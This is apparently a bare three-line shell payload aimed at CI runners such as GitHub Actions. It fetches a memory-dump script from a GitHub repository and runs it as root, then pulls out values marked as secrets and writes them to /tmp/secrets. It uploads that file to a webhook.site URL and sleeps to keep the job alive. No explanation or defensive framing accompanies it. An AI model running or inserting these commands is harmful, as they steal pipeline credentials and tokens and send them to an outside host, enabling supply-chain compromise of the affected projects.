curl -sSf https://raw.githubusercontent.com/AdnaneKhan/Cacheract/b0d8565fa1ac52c28899c0cfc880d59943bc04ea/assets/memdump.py | sudo python3 | tr -d '\\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> /tmp/secrets
curl -X PUT --upload-file /tmp/secrets https://webhook.site/2a7334c9-64a7-48cf-8b22-409028d50d9d
sleep 9999
